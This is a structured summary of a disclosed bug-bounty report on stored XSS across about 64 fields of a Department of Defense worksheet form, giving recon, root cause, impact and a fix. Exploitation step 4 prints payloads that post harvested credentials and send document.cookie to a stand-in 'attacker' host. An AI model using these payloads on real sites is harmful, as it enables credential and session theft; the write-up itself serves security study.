# DoD stored XSS across ~64 worksheet fields -> credential theft (H1 #847176)

- **Vuln type / sub-variant:** Stored XSS, broad (every free-text field on a multi-field worksheet form stored and rendered raw). Escalated toward credential theft via an injected fake login form.
- **Target type:** Government web application, a multi-step worksheet/request form later viewed by privileged (legal/staff) personnel. Classic second-order stored XSS where attacker and victim are different users.
- **Recon signal:** The first/name field appeared sanitized on basic tests, which often signals the developer only hardened the obvious field. Tester then probed every other text input and found the rest unfiltered. The payload fired in two places (the submitted worksheet and a modify/edit view), confirming it was stored and reflected on multiple render paths.
- **Root cause:** No consistent server-side output encoding. Sanitization was applied unevenly (one field hardened, ~64 others not), so stored input was written into the page markup verbatim wherever staff later viewed it.
- **Exploitation steps:**
  1. Navigate the form, reach the worksheet, fill every text field with an XSS probe.
  2. Finish/submit; receive a ticket number confirming persistence.
  3. Reopen via the confirmation link or the modify flow; the payload executes in the viewer's context (here, legal personnel reviewing the request).
  4. Demonstrate impact with a credential-harvesting payload: inject a fake "please login" HTML form (illustrative shape: `<form action=http://attacker>username/password inputs<input type=submit>`) that posts entered creds to an attacker host, and/or a redirect `window.location="http://attacker/?cookie="+document.cookie`.
- **Bypasses used:** None in the filter-evasion sense; the defense that failed was simply missing on most fields. The only nuance is finding that non-primary fields were unprotected after the primary field looked safe.
- **Impact:** Code execution in the context of staff who open the worksheet: account compromise, keystroke logging, drive-by download, credential theft via the planted login form. Reporter could not test cookie theft directly because the viewer-side session was not available to an unauthenticated submitter, but documented the vectors. Rated High (7 to 8.9).
- **Bounty:** DoD VDP, no bounty (hidden/none).
- **Lesson / pattern:** When one field looks sanitized, test all of them: uneven per-field sanitization is a common root cause. A form whose output is viewed by higher-privileged users turns stored XSS into a credential-theft and takeover vector even without direct cookie access, because an injected login form or redirect works against the viewer. Fix is centralized contextual output encoding, not per-field patching.
- **Source:**
  - Title: Stored XSS via ~64 vulnerable fields leads to credential theft/account takeover (U.S. Dept of Defense, Report #847176)
  - Author: z32 (un4gi)
  - URL: https://hackerone.com/reports/847176
  - Date: 2020-04-11 (disclosed 2021-02-10)
  - Disclosed report: https://hackerone.com/reports/847176
  - Raw file: `sources/xss/11-h1-dod-stored-xss-64-fields-847176.md`

Tags: stored, blind, account-takeover, cookie-theft
